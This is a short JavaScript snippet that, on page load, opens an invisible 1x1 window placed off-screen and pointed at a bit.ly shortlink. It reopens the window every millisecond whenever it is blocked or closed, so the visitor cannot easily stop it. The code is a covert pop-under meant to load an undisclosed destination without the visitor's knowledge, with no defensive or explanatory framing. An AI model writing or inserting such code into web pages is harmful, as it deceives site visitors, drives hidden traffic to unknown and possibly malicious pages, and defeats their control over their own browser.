function openFirstPopup() {
            // Define popup dimensions and position it off-screen
            var popupWidth = 1;
            var popupHeight = 1;
            var popupLeft = -1000; // Position off-screen
            var popupTop = -1000;  // Position off-screen

            // Open the popup window with specified dimensions and position
            var popup = window.open('https://bit.ly/liya___silver', '_blank', 'width=' + popupWidth + ', height=' + popupHeight + ', left=' + popupLeft + ', top=' + popupTop);

            function attemptOpen() {
                if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
                    // If popup is closed or blocked, retry recursively
                    setTimeout(function() {
                        popup = window.open('https://bit.ly/liya___silver', '_blank', 'width=' + popupWidth + ', height=' + popupHeight + ', left=' + popupLeft + ', top=' + popupTop);
                        attemptOpen(); // Retry recursively
                    }, 1);
                }
            }

            attemptOpen();
        }

        window.onload = function() {
            openFirstPopup(); // Execute the function when the page loads
        };
